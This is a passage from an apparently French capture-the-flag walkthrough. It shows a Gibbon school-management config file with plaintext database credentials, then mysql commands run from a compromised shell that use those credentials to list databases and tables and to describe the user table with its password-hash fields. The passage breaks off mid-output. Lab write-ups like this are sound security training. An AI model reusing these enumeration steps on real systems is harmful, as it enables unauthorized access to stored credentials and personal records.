+</span></span><span class="line"><span class="cl"> <span class="p">*</span> <span class="n">You</span> <span class="n">can</span> <span class="n">supply</span> <span class="n">an</span> <span class="n">optional</span> <span class="nv">$databasePort</span> <span class="k">if</span> <span class="n">your</span> <span class="n">server</span> <span class="n">requires</span> <span class="n">one</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"> <span class="p">*/</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$databaseServer</span> <span class="p">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$databaseUsername</span> <span class="p">=</span> <span class="s1">&#39;MrGibbonsDB&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$databasePassword</span> <span class="p">=</span> <span class="s1">&#39;MisterGibbs!Parrot!?1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$databaseName</span> <span class="p">=</span> <span class="s1">&#39;gibbon&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">/**</span>
+</span></span><span class="line"><span class="cl"> <span class="p">*</span> <span class="n">Sets</span> <span class="n">a</span> <span class="n">globally</span> <span class="n">unique</span> <span class="n">id</span><span class="p">,</span> <span class="n">to</span> <span class="n">allow</span> <span class="n">multiple</span> <span class="n">installs</span> <span class="n">on</span> <span class="n">a</span> <span class="n">single</span> <span class="n">server</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"> <span class="p">*/</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$guid</span> <span class="p">=</span> <span class="s1">&#39;7y59n5xz-uym-ei9p-7mmq-83vifmtyey2&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">/**</span>
+</span></span><span class="line"><span class="cl"> <span class="p">*</span> <span class="n">Sets</span> <span class="nb">system-wide</span> <span class="n">caching</span> <span class="n">factor</span><span class="p">,</span> <span class="n">used</span> <span class="n">to</span> <span class="n">balance</span> <span class="n">performance</span> <span class="n">and</span> <span class="n">freshness</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"> <span class="p">*</span> <span class="n">Value</span> <span class="n">represents</span> <span class="n">number</span> <span class="n">of</span> <span class="n">page</span> <span class="n">loads</span> <span class="n">between</span> <span class="n">cache</span> <span class="n">refresh</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"> <span class="p">*</span> <span class="n">Must</span> <span class="n">be</span> <span class="n">positive</span> <span class="n">integer</span><span class="p">.</span> <span class="mf">1</span> <span class="n">means</span> <span class="n">no</span> <span class="n">caching</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"> <span class="p">*/</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$caching</span> <span class="p">=</span> <span class="mf">10</span><span class="p">;</span></span></span></code></pre></div></div>
+<p>Je trouve les bases de données.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SHELL&gt; .\mysql.exe -u MrGibbonsDB -p&#34;MisterGibbs!Parrot!?1&#34; -e &#34;show databases;&#34;
+</span></span><span class="line"><span class="cl">Database
+</span></span><span class="line"><span class="cl">gibbon
+</span></span><span class="line"><span class="cl">information_schema
+</span></span><span class="line"><span class="cl">test</span></span></code></pre></div></div>
+<p>J’énumère les tables de la base de données Gibbon.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">SHELL</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">mysql</span><span class="p">.</span><span class="py">exe</span> <span class="n">-u</span> <span class="n">MrGibbonsDB</span> <span class="n">-p</span><span class="s2">&#34;MisterGibbs!Parrot!?1&#34;</span> <span class="n">-e</span> <span class="s2">&#34;use gibbon; show tables;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Tables_in_gibbon</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonaction</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonactivity</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonactivityattendance</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonactivityslot</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonactivitystaff</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonactivitystudent</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonactivitytype</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonadmissionsaccount</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonadmissionsapplication</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonalarm</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonalarmconfirm</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonalertlevel</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonapplicationform</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonapplicationformfile</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonapplicationformlink</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonapplicationformrelationship</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonattendancecode</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonattendancelogcourseclass</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonattendancelogformgroup</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonattendancelogperson</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonbehaviour</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonbehaviourletter</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibboncountry</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibboncourse</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibboncourseclass</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibboncourseclassmap</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibboncourseclassperson</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibboncrowdassessdiscuss</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibboncustomfield</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbondataretention</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbondaysofweek</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbondepartment</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbondepartmentresource</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbondepartmentstaff</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbondiscussion</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbondistrict</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonemailtemplate</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonexternalassessment</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonexternalassessmentfield</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonexternalassessmentstudent</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonexternalassessmentstudententry</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfamily</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfamilyadult</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfamilychild</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfamilyrelationship</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfamilyupdate</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfileextension</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfinancebillingschedule</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfinancebudget</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfinancebudgetcycle</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfinancebudgetcycleallocation</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfinancebudgetperson</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfinanceexpense</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfinanceexpenseapprover</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfinanceexpenselog</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfinancefee</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfinancefeecategory</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfinanceinvoice</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfinanceinvoicee</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfinanceinvoiceeupdate</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfinanceinvoicefee</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfirstaid</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonfirstaidfollowup</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonform</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonformfield</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonformgroup</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonformpage</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonformsubmission</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonformupload</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbongroup</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbongroupperson</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonhook</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonhouse</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibboni18n</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonin</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibboninarchive</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibboninassistant</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonindescriptor</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonininvestigation</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonininvestigationcontribution</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibboninpersondescriptor</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibboninternalassessmentcolumn</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibboninternalassessmententry</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonlanguage</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonlibraryitem</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonlibraryitemevent</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonlibrarytype</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonlog</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonmarkbookcolumn</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonmarkbookentry</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonmarkbooktarget</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonmarkbookweight</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonmedicalcondition</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonmessenger</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonmessengercannedresponse</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonmessengerreceipt</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonmessengertarget</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonmigration</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonmodule</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonnotification</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonnotificationevent</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonnotificationlistener</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonoutcome</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonpayment</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonpermission</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonperson</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonpersonaldocument</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonpersonaldocumenttype</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonpersonmedical</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonpersonmedicalcondition</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonpersonmedicalconditionupdate</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonpersonmedicalupdate</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonpersonreset</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonpersonstatuslog</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonpersonupdate</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonplannerentry</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonplannerentrydiscuss</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonplannerentryguest</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonplannerentryhomework</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonplannerentryoutcome</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonplannerentrystudenthomework</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonplannerentrystudenttracker</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonplannerparentweeklyemailsummary</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonreport</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonreportarchive</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonreportarchiveentry</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonreportingaccess</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonreportingcriteria</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonreportingcriteriatype</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonreportingcycle</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonreportingprogress</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonreportingproof</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonreportingscope</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonreportingvalue</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonreportprototypesection</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonreporttemplate</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonreporttemplatefont</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonreporttemplatesection</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonresource</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonresourcetag</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonrole</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonrubric</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonrubriccell</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonrubriccolumn</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonrubricentry</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonrubricrow</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonscale</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonscalegrade</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonschoolyear</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonschoolyearspecialday</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonschoolyearterm</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonsession</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonsetting</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonspace</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonspaceperson</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstaff</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstaffabsence</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstaffabsencedate</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstaffabsencetype</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstaffapplicationform</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstaffapplicationformfile</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstaffcontract</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstaffcoverage</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstaffcoveragedate</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstaffduty</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstaffdutyperson</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstaffjobopening</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstaffupdate</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstring</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstudentenrolment</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstudentnote</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonstudentnotecategory</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonsubstitute</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbontheme</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbontt</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonttcolumn</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonttcolumnrow</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonttday</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonttdaydate</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonttdayrowclass</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonttdayrowclassexception</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonttimport</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonttspacebooking</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonttspacechange</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonunit</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonunitblock</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonunitclass</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonunitclassblock</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonunitoutcome</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonusernameformat</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonyeargroup</span></span></span></code></pre></div></div>
+<p>Les utilisateurs se trouvent dans la table <strong><code>gibbonperson</code></strong>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">SHELL</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">mysql</span><span class="p">.</span><span class="py">exe</span> <span class="n">-u</span> <span class="n">MrGibbonsDB</span> <span class="n">-p</span><span class="s2">&#34;MisterGibbs!Parrot!?1&#34;</span> <span class="n">-e</span> <span class="s2">&#34;use gibbon; describe gibbonperson;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Field</span>   <span class="nb">Type </span>   <span class="n">Null</span>    <span class="n">Key</span>     <span class="k">Default</span> <span class="n">Extra</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonPersonID</span>  <span class="n">int</span><span class="p">(</span><span class="mf">10</span><span class="p">)</span> <span class="n">unsigned</span> <span class="n">zerofill</span>       <span class="n">NO</span>      <span class="n">PRI</span>     <span class="n">NULL</span>    <span class="n">auto_increment</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span>   <span class="n">varchar</span><span class="p">(</span><span class="mf">5</span><span class="p">)</span>      <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">surname</span> <span class="n">varchar</span><span class="p">(</span><span class="mf">60</span><span class="p">)</span>     <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">firstName</span>       <span class="n">varchar</span><span class="p">(</span><span class="mf">60</span><span class="p">)</span>     <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">preferredName</span>   <span class="n">varchar</span><span class="p">(</span><span class="mf">60</span><span class="p">)</span>     <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">officialName</span>    <span class="n">varchar</span><span class="p">(</span><span class="mf">150</span><span class="p">)</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">nameInCharacters</span>        <span class="n">varchar</span><span class="p">(</span><span class="mf">60</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">gender</span>  <span class="n">enum</span><span class="p">(</span><span class="s1">&#39;M&#39;</span><span class="p">,</span><span class="s1">&#39;F&#39;</span><span class="p">,</span><span class="s1">&#39;Other&#39;</span><span class="p">,</span><span class="s1">&#39;Unspecified&#39;</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">Unspecified</span>
+</span></span><span class="line"><span class="cl"><span class="n">username</span>        <span class="n">varchar</span><span class="p">(</span><span class="mf">20</span><span class="p">)</span>     <span class="n">NO</span>      <span class="n">UNI</span>     <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">passwordStrong</span>  <span class="n">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">passwordStrongSalt</span>      <span class="n">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">passwordForceReset</span>      <span class="n">enum</span><span class="p">(</span><span class="s1">&#39;N&#39;</span><span class="p">,</span><span class="s1">&#39;Y&#39;</span><span class="p">)</span>   <span class="n">NO</span>              <span class="n">N</span>
+</span></span><span class="line"><span class="cl"><span class="n">status</span>  <span class="n">enum</span><span class="p">(</span><span class="s1">&#39;Full&#39;</span><span class="p">,</span><span class="s1">&#39;Expected&#39;</span><span class="p">,</span><span class="s1">&#39;Left&#39;</span><span class="p">,</span><span class="s1">&#39;Pending Approval&#39;</span><span class="p">)</span>       <span class="n">NO</span>              <span class="n">Full</span>
+</span></span><span class="line"><span class="cl"><span class="n">canLogin</span>        <span class="n">enum</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="s1">&#39;N&#39;</span><span class="p">)</span>   <span class="n">NO</span>              <span class="n">Y</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonRoleIDPrimary</span>     <span class="n">int</span><span class="p">(</span><span class="mf">3</span><span class="p">)</span> <span class="n">unsigned</span> <span class="n">zerofill</span>        <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonRoleIDAll</span> <span class="n">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">dob</span>     <span class="n">date</span>    <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">email</span>   <span class="n">varchar</span><span class="p">(</span><span class="mf">75</span><span class="p">)</span>     <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">emailAlternate</span>  <span class="n">varchar</span><span class="p">(</span><span class="mf">75</span><span class="p">)</span>     <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">image_240</span>       <span class="n">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span>    <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">lastIPAddress</span>   <span class="n">varchar</span><span class="p">(</span><span class="mf">15</span><span class="p">)</span>     <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">lastTimestamp</span>   <span class="n">timestamp</span>       <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">lastFailIPAddress</span>       <span class="n">varchar</span><span class="p">(</span><span class="mf">15</span><span class="p">)</span>     <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">lastFailTimestamp</span>       <span class="n">timestamp</span>       <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">failCount</span>       <span class="n">int</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span>  <span class="n">YES</span>             <span class="mf">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">address1</span>        <span class="n">mediumtext</span>      <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">address1District</span>        <span class="n">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">address1Country</span> <span class="n">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">address2</span>        <span class="n">mediumtext</span>      <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">address2District</span>        <span class="n">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">address2Country</span> <span class="n">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">phone1Type</span>      <span class="n">enum</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;Mobile&#39;</span><span class="p">,</span><span class="s1">&#39;Home&#39;</span><span class="p">,</span><span class="s1">&#39;Work&#39;</span><span class="p">,</span><span class="s1">&#39;Fax&#39;</span><span class="p">,</span><span class="s1">&#39;Pager&#39;</span><span class="p">,</span><span class="s1">&#39;Other&#39;</span><span class="p">)</span>   <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">phone1CountryCode</span>       <span class="n">varchar</span><span class="p">(</span><span class="mf">7</span><span class="p">)</span>      <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">phone1</span>  <span class="n">varchar</span><span class="p">(</span><span class="mf">20</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">phone3Type</span>      <span class="n">enum</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;Mobile&#39;</span><span class="p">,</span><span class="s1">&#39;Home&#39;</span><span class="p">,</span><span class="s1">&#39;Work&#39;</span><span class="p">,</span><span class="s1">&#39;Fax&#39;</span><span class="p">,</span><span class="s1">&#39;Pager&#39;</span><span class="p">,</span><span class="s1">&#39;Other&#39;</span><span class="p">)</span>   <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">phone3CountryCode</span>       <span class="n">varchar</span><span class="p">(</span><span class="mf">7</span><span class="p">)</span>      <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">phone3</span>  <span class="n">varchar</span><span class="p">(</span><span class="mf">20</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">phone2Type</span>      <span class="n">enum</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;Mobile&#39;</span><span class="p">,</span><span class="s1">&#39;Home&#39;</span><span class="p">,</span><span class="s1">&#39;Work&#39;</span><span class="p">,</span><span class="s1">&#39;Fax&#39;</span><span class="p">,</span><span class="s1">&#39;Pager&#39;</span><span class="p">,</span><span class="s1">&#39;Other&#39;</span><span class="p">)</span>   <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">phone2CountryCode</span>       <span class="n">varchar</span><span class="p">(</span><span class="mf">7</span><span class="p">)</span>      <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">phone2</span>  <span class="n">varchar</span><span class="p">(</span><span class="mf">20</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
